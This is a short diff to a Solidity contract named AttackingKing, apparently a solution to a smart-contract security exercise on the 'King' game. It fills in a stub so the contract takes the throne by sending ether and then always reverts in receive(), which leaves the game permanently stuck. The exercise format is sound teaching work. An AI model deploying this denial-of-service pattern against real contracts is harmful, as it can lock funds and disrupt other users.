@@ -4,13 +4,18 @@ import "./King.sol";
 import "hardhat/console.sol";
 
 contract AttackingKing {
-    address public contractAddress;
+    King public king;
 
-    constructor(address _contractAddress) payable {
-        contractAddress = _contractAddress;
+    constructor(address payable _king) payable {
+        king = King(_king);
     }
 
     function hackContract() external {
         // Code me!
+        address(king).call{value: address(this).balance}("");
+    }
+
+    receive() external payable {
+        require(false, "lol nope");
     }
 }
